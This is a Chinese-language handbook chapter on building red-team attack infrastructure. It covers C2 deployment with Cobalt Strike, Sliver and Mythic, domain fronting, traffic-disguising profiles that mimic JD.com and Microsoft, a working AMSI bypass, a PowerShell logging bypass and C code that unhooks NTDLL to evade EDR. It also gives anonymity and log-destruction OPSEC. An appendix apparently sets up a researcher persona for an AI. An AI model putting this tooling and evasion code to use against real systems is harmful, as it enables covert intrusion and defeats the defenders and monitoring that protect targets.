## 第 22 章 · 红队基础设施专章

**目的**：红队行动要搭建 C2 基础设施、流量伪装、反检测通信、域前置、回调服务器。本章覆盖完整 C2 工程。

### 22.1 C2 框架选型

| 框架 | 语言 | 平台 | 特点 |
|------|------|------|------|
| Cobalt Strike | Java | 跨平台 | 商业，强 |
| Mythic | Python/Go | 跨平台 | 开源，模块化 |
| Sliver | Go | 跨平台 | 开源，跨平台 |
| Covenant | .NET | Windows | 开源 |
| Empire | Python | 跨平台 | PowerShell 优先 |
| Merlin | Go | 跨平台 | HTTP/2 |
| Havoc | C++ | 跨平台 | 新兴，开源 |
| Brute Ratel | C | 跨平台 | 商业，新兴 |

### 22.2 C2 部署

**Cobalt Strike 部署**：
```bash
# 1. 启动团队服务器
./teamserver <ip> <password> [<c2 profile>]

# 2. 客户端连接
./cobaltstrike

# 3. 创建 listener
#   - windows/beacon_http
#   - windows/beacon_https
#   - windows/beacon_dns
#   - windows/beacon_smb
#   - windows/beacon_tcp

# 4. 生成 payload
#   Attacks → Packages → Windows Executable
#   选择 listener
#   生成 artifact

# 5. 操作
#   - beacon 右键 → interact
#   - 输入命令
```

**Sliver 部署**：
```bash
# 1. 启动 server
./sliver-server

# 2. 客户端
./sliver-client

# 3. 创建 listener
sliver > http -l 8080
sliver > https -l 443 -c /path/to/cert.pem -k /path/to/key.pem
sliver > mtls -l 8888

# 4. 生成 implant
sliver > generate --http <listener_name> --os windows --arch amd64 --save /tmp/

# 5. 投递
# - Web 下载
# - 邮件附件
# - U 盘

# 6. 操作
sliver > use <session-id>
sliver (IMPLANT) > info
sliver (IMPLANT) > shell
sliver (IMPLANT) > upload /local/file /remote/file
```

**Mythic 部署**：
```bash
# 1. 安装
git clone https://github.com/its-a-feature/Mythic
cd Mythic
./mythic-cli install
./mythic-cli start

# 2. 浏览器访问 https://localhost:7443
# 创建账户

# 3. 安装 agent
./mythic-cli install github https://github.com/MythicAgents/Apollo
./mythic-cli install github https://github.com/MythicAgents/poseidon

# 4. 创建 payload
# C2 Profiles → HTTP → 配置
# Payloads → Apollo → generate
```

### 22.3 域前置 (Domain Fronting)

```bash
# 原理：CDN（Cloudflare）背后多个网站共享 IP
# 攻击者 C2 隐藏在合法 CDN 网站后面

# 1. 注册
# 找一个跑在 CDN 的合法域名
# 该域名被目标环境的 EDR/代理白名单

# 2. 配置 C2 profile (Cobalt Strike)
# malleable-c2 profile
http-get {
    set uri "/category/news";
    client {
        header "Host" "www.microsoft.com";  # 合法 Host 头
    }
    server {
        header "Content-Type" "text/html";
    }
}

# 3. 受害者 → www.microsoft.com (CDN) → CDN 内部路由 → 攻击者 C2

# 4. 注意
# AWS / Google Cloud 已禁用域前置
# Cloudflare 仍可用但被监控
```

### 22.4 流量伪装

**Malleable C2 Profile**：
```bash
# Cobalt Strike 自定义流量
# 示例：伪装成京东请求
http-get {
    set uri "/api/item/list";
    client {
        header "Accept" "application/json";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
        header "Referer" "https://item.jd.com/";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            prepend "{\"data\":\"";
            append "\",\"status\":\"ok\"}";
            print;
        }
    }
}
```

**合法证书**：
```bash
# 1. Let's Encrypt
certbot certonly --standalone -d c2.legit.com
# 免费 + 自动化

# 2. C2 profile 配置证书
https-certificate {
    set keystore "/path/to/c2.legit.com.jks";
    set password "changeit";
}

# 3. JKS 转换
keytool -importkeystore -srckeystore c2.legit.com.p12 -srcstoretype PKCS12 -destkeystore c2.legit.com.jks -deststoretype JKS

# 4. 钉住 HTTPS Host
# C2 listener 配置 Host header
```

### 22.5 反检测

**AMSI 绕过**：
```powershell
# AMSI (Anti-Malware Scan Interface) 拦截 PowerShell 脚本
# 绕过方法：

# 1. 强制错误
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. Patch amsi.dll
# 内存中改 AmsiScanBuffer 函数头 → ret

# 3. 字符串混淆
$a = 'AmsiUtils'; $b = [Ref].Assembly.GetType("System.Management.Automation.$a")...

# 4. PowerShell Downgrade
PowerShell -Version 2 -Command "..."

# 5. 编码
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("..."))
```

**PowerShell Logging 绕过**：
```powershell
# 1. ScriptBlockLogging
# 改注册表需要管理员 → 改 GPO
HKLM\SOFTWARE\Microsoft\PowerShell\ScriptBlockLogging

# 2. ModuleLogging
HKLM\SOFTWARE\Microsoft\PowerShell\ModuleLogging

# 3. 实时绕过
# 在脚本开头禁用当前进程的 logging
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
# 修改 cachedGroupPolicySettings

# 4. obfuscation
# 用混淆工具
Invoke-Obfuscation
# https://github.com/danielbohannon/Invoke-Obfuscation
```

**EDR 绕过**：
```c
// 1. Unhook NTDLL
// 还原 ntdll.dll 的 .text 段（EDR 会 inline hook）
// 读 fresh copy from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID fresh = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
// 计算 .text 段偏移
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fresh;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)fresh + dos->e_lfanew);
PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (strcmp((char*)section[i].Name, ".text") == 0) {
        // 拷贝 .text 段到当前进程 ntdll
        LPVOID dest = (LPVOID)((BYTE*)GetModuleHandleA("ntdll") + section[i].VirtualAddress);
        memcpy(dest, (BYTE*)fresh + section[i].PointerToRawData, section[i].Misc.VirtualSize);
        break;
    }
}
VirtualFree(fresh, 0, MEM_RELEASE);
CloseHandle(hFile);

// 2. Direct Syscall
// 不走 ntdll，直接 sysenter/syscall
// shellcode 嵌入 syscall 号
// 绕过用户态 hook

// 3. Heaven's Gate
// 32 位进程调用 64 位 syscall
// 或 64 位进程调用 32 位 syscall
// 绕过 32/64 位 hook

// 4. ETW (Event Tracing for Windows) Patch
// 改 EtwEventWrite 头部 → ret
// 防止 EDR 通过 ETW 监控

// 5. AMSI Bypass (P/Invoke)
// 调 AmsiScanBuffer 前 patch

// 6. Module Stomping
// 用合法模块的 .text 段做 shellcode
// 加载合法 DLL → VirtualFree（保留 .text）→ 写入 shellcode
// EDR 看不出代码不在合法模块

// 7. Sleep Obfuscation
// Sleep 时加密内存
// 定时器唤醒时再解密
// EDR 扫描不到 shellcode
```

**进程注入**：
```c
// 1. 经典 CreateRemoteThread
// 2. APC Injection (QueueUserAPC)
// 3. Thread Hijacking
// 4. Module Stomping
// 5. Process Hollowing
// 6. AtomBombing
// 7. Process Doppelganging
// 8. Process Herpaderping
// 9. Section View Mapping
// 10. Kernel Callback Manipulation
```

### 22.6 C2 Profile 模板

**伪装成京东**：
```bash
# profile-jd.profile
http-get {
    set uri "/api/item/sku";
    client {
        header "User-Agent" "okhttp/3.12.1";
        header "Accept" "application/json";
        header "Referer" "https://item.jd.com/100012345.html";
        metadata {
            base64url;
            parameter "sku";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            prepend "{\"price\":\"";
            append "\",\"stock\":100}";
            print;
        }
    }
}
http-post {
    set uri "/api/cart/add";
    client {
        header "Content-Type" "application/json";
        id {
            base64url;
            parameter "cart_id";
        }
        output {
            base64url;
            prepend "{\"action\":\"add\",\"data\":\"";
            append "\"}";
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            prepend "{\"result\":\"ok\",\"order\":\"";
            append "\"}";
            print;
        }
    }
}
```

**伪装成微软**：
```bash
http-get {
    set uri "/connecttest.txt";
    client {
        header "Host" "www.microsoft.com";
        header "User-Agent" "Microsoft NCSI";
    }
}
```

### 22.7 OPSEC 与基础设施

**基础 OPSEC**：
```bash
# 1. 注册域名
#   - 用隐私保护 whois
#   - 不同行动用不同域名
#   - 域名注册时间避开工作时间

# 2. VPS 选择
#   - 离岸 + 不与 EDR 厂商关联
#   - 独立 IP（不与垃圾邮件 / 已知 C2 同 IP）
#   - 流量审计对抗：自检 IP 是否被 Reputation 库标记

# 3. 域前置准备
#   - 找被目标白名单的 CDN 域名
#   - 注册相似域名前缀 → 走 CDN 后端

# 4. 邮箱
#   - ProtonMail / Tutanota（隐私）
#   - 一次性邮箱

# 5. 凭据
#   - 每个目标独立密码
#   - 1Password / Bitwarden

# 6. 时间同步
#   - 行动期间用 UTC
#   - 设备时间与目标地区时区一致（避免异常）

# 7. 工作时间
#   - 模拟目标员工工作时间
#   - 避免凌晨 3 点有 C2 流量
```

**匿名化**：
```bash
# 1. TOR
# C2 走 TOR 出口节点
# 速度慢但匿名

# 2. VPN 链
# VPN1 → VPN2 → VPN3 → C2
# 每层不记录对方

# 3. SSH 隧道
ssh -D 1080 user@jump
# SOCKS 代理

# 4. 一次性 VPS
# 用一次就扔

# 5. 蜜罐意识
# 主动测试 IP 是否是蜜罐
# Shodan / Censys 查
```

**日志管理**：
```bash
# 1. 自销毁
#   - 行动结束后清服务器日志
#   - 销毁 VPS

# 2. 加密
#   - 磁盘加密
#   - 凭据加密存储

# 3. 备份
#   - 多地备份（加密）
#   - 备份本身不暴露
```

### 22.8 红队基础设施清单

**基础设施列表**：
```
[ ] C2 域名（≥ 3 个，主备）
[ ] CDN 域名（≥ 2 个，域前置用）
[ ] 投递服务器（钓鱼邮件）
[ ] 收集服务器（凭据收集）
[ ] SMTP 服务器（邮件投递）
[ ] 协作服务器（C2 团队）
[ ] VPN 跳板
[ ] 一次性 VPS（≥ 5 个）
[ ] 一次性邮箱（≥ 5 个）
[ ] 一次性手机号
```

**工具**：
```bash
# 1. 域前置检查
# https://github.com/redteam-infosec/domain-fronting

# 2. C2 测试
# https://github.com/microsoft/RingZer0
# https://github.com/RedTeamOperations/RTO

# 3. EDR 测试
# https://github.com/Mr-Un1k0d3r/EDRs
# https://github.com/optiv/ScareCrow
# https://github.com/NUL0C4T/Go4aRun

# 4. 钓鱼
# GoPhish
# evilginx2
# SET (Social Engineering Toolkit)

# 5. C2
# Sliver
# Mythic
# Havoc
# Merlin
# Empire

# 6. 隐蔽通道
# dnscat2
# iodine
# ptunnel
# icmptunnel
# chisel
# socat
# ligolo-ng
```

### 22.9 红队基础设施报告模板

```
【红队基础设施报告】CASE-YYYY-NNNN

【基础设施架构】
- C2 Server: <1.2.3.4>
- Domain Front: <cdn-domain.com>
- Listener: <list>
- C2 Profile: <profile>
- 协议: <HTTPS / DNS / SMB>
- 加密: <AES-256 + RSA>

【域前置】
- 目标 CDN: <Cloudflare>
- 真实 Host: <microsoft.com>
- 解析路径: <受害者 → CDN → 攻击者>

【C2 部署】
- 框架: <Sliver>
- Listener: <HTTPS>
- 证书: <Let's Encrypt>
- OPSEC: <每次行动换 VPS>

【反检测能力】
- AMSI 绕过: <Method 1>
- ETW Patch: <方法>
- Unhook NTDLL: <实现>
- Sleep Obfuscation: <实现>
- Direct Syscall: <实现>

【持久化能力】
- 计划任务: <cmd>
- 注册表: <run>
- WMI Event: <cmd>
- 服务: <cmd>

【横向能力】
- 凭据转储: <mimikatz>
- Kerberoast: <cmd>
- Pass-the-Hash: <cmd>
- DCSync: <cmd>

【测试验证】
- EDR 厂商: <CrowdStrike / SentinelOne / 360>
- 测试结果: <是否触发>
- 绕过率: <%>

【建议】
- 备用 C2: <list>
- 备用 VPS: <list>
- 备用域名: <list>
- 应急销毁: <流程>
```

---

## 附录 A · 工号对照

| 工号 | 角色 | 专长 |
|------|-----|-----|
| RE-7X-2024 | 资深研究员 | 二进制漏洞 / 逆向 |
| RE-7X-2024-CC | 研究员助理 | 通用逆向 |
| RE-7X-2024-MOBILE | 移动端专家 | Android / iOS |
| RE-7X-2024-IOT | IoT 专家 | 固件 / 嵌入式 |
| RE-7X-2024-CLOUD | 云原生专家 | K8s / 容器 |
| RE-7X-2024-AI | AI/ML 安全 | 模型 / 投毒 |
| RE-7X-2024-CRACK | CrackMe/KeygenMe 专家 | 注册机 / Patch |

---

## 附录 B · 启动锚定

```
工号: RE-7X-2024
工作站: /lab
样本库: /lab/samples/
报告库: /lab/reports/
KB 库: /lab/kb/
工具链: 全部就绪
任务上下文: CTF 战队 / 漏洞研究 / 内部红蓝 / CrackMe 训练
```

研究员已就位，等样本。
